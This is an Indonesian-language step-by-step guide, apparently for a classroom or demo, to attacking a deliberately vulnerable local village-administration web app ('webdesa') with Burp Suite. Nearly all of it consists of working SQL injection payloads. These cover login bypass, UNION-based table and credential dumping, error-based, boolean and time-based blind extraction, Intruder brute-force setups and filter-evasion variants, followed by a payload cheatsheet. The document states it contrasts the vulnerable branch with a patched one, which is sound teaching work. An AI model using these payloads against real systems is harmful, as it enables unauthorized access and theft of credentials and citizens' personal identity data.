# Non-Secure — Panduan Serangan SQL Injection + Burp Suite

**Branch:** `master`
**Target:** `http://localhost/webdesa/`
**Tools:** Burp Suite + Browser (Firefox/Chrome set proxy 127.0.0.1:8080)

---

## Setup Burp Suite

1. Buka Burp Suite → **Proxy** → **Options**
2. Pastikan listener aktif di `127.0.0.1:8080`
3. Browser → set proxy manual `127.0.0.1:8080`
4. Buka `http://localhost/webdesa/`
5. Burp → **Proxy** → **Intercept** → klik **Intercept is on**

---

## Skenario 1: Login Bypass (Authentication Bypass)

### Langkah
| # | Aksi | Detail |
|---|------|--------|
| 1 | Browser buka | `http://localhost/webdesa/admin/login.php` |
| 2 | Burp | Klik **Intercept is on** (tombol hijau) |
| 3 | Browser | Isi username: `apaaja`, password: `apaaja`, klik Login |
| 4 | Burp | Request muncul di tab Proxy → Intercept |
| 5 | Burp | Send to **Repeater** (Ctrl+R) |
| 6 | Repeater | Ubah parameter: `username=admin'-- -&password=x` |
| 7 | Repeater | Klik **Send** |
| 8 | Response | Cek **302 Redirect** ke `dashboard.php` → **Login berhasil!** |

### Payload Lain
```
username: ' OR '1'='1'-- -
username: ' OR 1=1-- -
username: admin'/*
```

### Penjelasan
```
Query asli:
  SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'x'

Comment SQL (-- -) menghapus sisanya:
  SELECT * FROM users WHERE username = 'admin'
→ Data user admin ditemukan, login berhasil tanpa password.
```

---

## Skenario 2: Ekstraksi Data via UNION SELECT

### Step 1: Cek Jumlah Kolom
| # | Aksi | Detail |
|---|------|--------|
| 1 | Burp | Intercept POST ke `http://localhost/webdesa/cek_warga.php` |
| 2 | Browser | Isi NIK: `123`, klik Cek Data |
| 3 | Burp | Send to Repeater |
| 4 | Repeater | Ubah `nik=123` → `nik=' ORDER BY 1-- -` |
| 5 | Repeater | Send → response normal (data tidak ditemukan) |
| 6 | Repeater | Naikkan: `ORDER BY 2`, `ORDER BY 3`, ... sampai error |

**Hasil:** Error di `ORDER BY 13` → **12 kolom**.

### Step 2: Identifikasi Kolom yang Tampil
```
Payload:
nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -

Response:
Tampilkan angka 1, 2, 3, dst.
Catat posisi mana yang muncul di halaman.
```
**Hasil:** Kolom 2 dan 5 biasanya tampil (nama, alamat).

### Step 3: Extract Database Info
```
# Versi MySQL
nik=' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12-- -

# Database user
nik=' UNION SELECT 1,user(),3,4,5,6,7,8,9,10,11,12-- -

# Nama database
nik=' UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12-- -
```

### Step 4: Enumerasi Tabel
```
nik=' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema=database()-- -
```
**Hasil:** `users,warga,surat_pengajuan,berita`

### Step 5: Enumerasi Kolom Tabel Users
```
nik=' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
```
**Hasil:** `id,username,password,nama_lengkap,role,created_at`

### Step 6: Dump Credentials (Admin + Petugas)
```
nik=' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
```
**Hasil:**
```
admin:admin123
petugas1:petugas123
```

### Step 7: Dump Data Warga
```
nik=' UNION SELECT 1,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM warga-- -
```

---

## Skenario 3: Error-Based Injection (berita_detail.php)

Langsung di browser — tidak perlu Burp untuk testing awal.

```
http://localhost/webdesa/berita_detail.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```
**Hasil:** Error message menampilkan versi MySQL.

```
http://localhost/webdesa/berita_detail.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users),0x7e))-- -
```
**Hasil:** Semua username:password muncul di error message.

---

## Skenario 4: Boolean-Based Blind Injection

Gunakan Burp **Comparer** untuk deteksi perbedaan response.

```
# TRUE (data ditemukan)
nik=' AND 1=1-- -
Response: "Data Ditemukan" (normal)

# FALSE (data tidak ditemukan)  
nik=' AND 1=2-- -
Response: "NIK tidak terdaftar" (beda)

# Tebak karakter pertama database
nik=' AND SUBSTRING((SELECT database()),1,1)='w'-- -
# → jika TRUE, karakter pertama adalah 'w'
```

Burp Intruder:
1. Send request ke **Intruder** (Ctrl+I)
2. Mark posisi: `nik=' AND SUBSTRING((SELECT database()),§1§,1)='§w§'-- -`
3. Set payload 1: Numbers 1-20
4. Set payload 2: Brute force a-z, 0-9
5. Start attack → cari response length yang berbeda

---

## Skenario 5: Time-Based Blind Injection

```
# Delay 5 detik → injection berhasil
nik=' AND SLEEP(5)-- -

# Conditional: jika database = 'webdesa', delay 5 detik
nik=' AND IF((SELECT database())='webdesa',SLEEP(5),0)-- -

# Ekstraksi karakter per karakter (dengan delay)
nik=' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(3),0)-- -
```
Burp Intruder:
- Gunakan **Resource pool** → max concurrent: 1
- Filter response by **response received** (delay)

---

## Skenario 6: GET-Based Injection (Search Warga)

Browser langsung:
```
http://localhost/webdesa/admin/warga.php?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
```

Burp Intruder untuk fuzzing:
1. Target: `GET /webdesa/admin/warga.php?q=§FUZZ§`
2. Payload: SQLi wordlist
3. Filter: Response length

---

## Skenario 7: Blind Injection di Filter Surat

Browser:
```
http://localhost/webdesa/admin/surat.php?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -
```

Catatan: Tabel surat_pengajuan memiliki 14 kolom (COBA DULU dengan ORDER BY 14).

---

## Skenario 8: Multi-Step Blind Extraction (Tanpa UNION)

Gunakan Burp Intruder untuk ekstraksi bertahap.

### Step 1: Cari panjang password admin
```
# True jika panjang password = 8 (admin123)
nik=' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=8-- -
```

### Step 2: Ekstraksi karakter per karakter
```
# True jika karakter ke-1 = 'a'
nik=' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
```

Burp Intruder config:
1. Payload position: SUBSTRING(password,§1§,1)='§§'
2. Payload 1: Numbers 1-100
3. Payload 2: Brute force `abcdefghijklmnopqrstuvwxyz0123456789`
4. Resource pool: 1 concurrent
5. Sort result by **response length**

---

## Skenario 9: WAF Bypass Techniques

Jika ada filter dasar, coba:

```
# Komentar alternatif
admin'-- -
admin'--+
admin'#
admin'/*

# Spasi bypass
'/**/OR/**/1=1-- -
'%09OR%091=1-- -    (tab)
'%0aOR%0a1=1-- -    (newline)

# Case bypass
' oR 1=1-- -
' UnIoN sElEcT 1,2,3-- -

# Encoding
%27%20OR%201%3D1--%20-   (URL encoded)
```

---

## Tabel Referensi Cepat

### Injection Points

| # | File | Parameter | Method | Query |
|---|------|-----------|--------|-------|
| 1 | cek_warga.php | nik | POST | `WHERE nik = '$nik'` |
| 2 | ajukan_surat.php (step 1) | nik | POST | `WHERE nik = '$nik'` |
| 3 | ajukan_surat.php (step 3) | warga_id, jenis_surat, dll | POST | `INSERT INTO ... VALUES('$val')` |
| 4 | riwayat.php | nik | POST | `WHERE w.nik = '$nik'` |
| 5 | berita_detail.php | id | GET | `WHERE id = '$id'` |
| 6 | admin/login.php | username, password | POST | `WHERE username = '$u' AND password = '$p'` |
| 7 | admin/warga.php | q | GET | `WHERE nama LIKE '%$q%'` |
| 8 | admin/warga.php | hapus | GET | `DELETE WHERE id='$id'` |
| 9 | admin/warga.php | POST fields | POST | INSERT/UPDATE raw |
| 10 | admin/surat.php | status | GET | `WHERE status = '$status'` |
| 11 | admin/surat.php | POST fields | POST | UPDATE raw |
| 12 | admin/berita.php | hapus/toggle/POST | GET/POST | CRUD raw |
| 13 | berita_detail.php | id (sidebar) | GET | `WHERE id != '$id'` |

### Payload Cheatsheet

```
ORDER BY:  ' ORDER BY 12-- -
UNION:     ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
VERSION:   ' UNION SELECT 1,version(),3,database(),5,6,7,8,9,10,11,12-- -
TABLES:    ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema=database()-- -
COLUMNS:   ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
DUMP:      ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
ERROR:     ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
TIME:      ' AND SLEEP(5)-- -
```

### Burp Shortcuts

| Shortcut | Fungsi |
|----------|--------|
| Ctrl+R | Send to Repeater |
| Ctrl+I | Send to Intruder |
| Ctrl+Shift+R | Send to Comparer |
| Ctrl+U | URL encode |
| Ctrl+Shift+U | URL decode |
| Space | Forward intercepted request |

---

## Catatan Demo

1. **master branch** → Semua serangan berhasil (SQLi terbukti)
2. **secure-v2 branch** → Payload SAMA PERSIS gagal total
3. Tujuan: Tunjukkan satu payload di browser → sukses di master, gagal di secure-v2
